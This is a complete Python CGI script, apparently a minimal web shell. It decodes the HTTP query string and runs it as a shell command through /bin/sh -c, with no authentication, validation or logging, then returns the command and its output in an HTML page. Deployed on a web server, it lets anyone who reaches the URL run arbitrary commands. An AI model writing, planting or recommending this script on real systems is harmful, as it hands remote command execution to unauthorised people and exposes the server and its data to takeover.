#!/usr/bin/env python
import cgitb; cgitb.enable()

import os, urllib, subprocess as sub

# Retrieve the command from the query string
# and unencode the escaped %xx chars
str_command = urllib.unquote(os.environ['QUERY_STRING'])

p = sub.Popen(['/bin/sh', '-c', str_command], 
    stdout=sub.PIPE, stderr=sub.STDOUT)
output = urllib.unquote(p.stdout.read())

print """\
Content-Type: text/html\n
<html>
<head>
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
</head>
<body>
<pre>
$ %s
%s
</pre>
</body></html>
""" % (str_command, output)
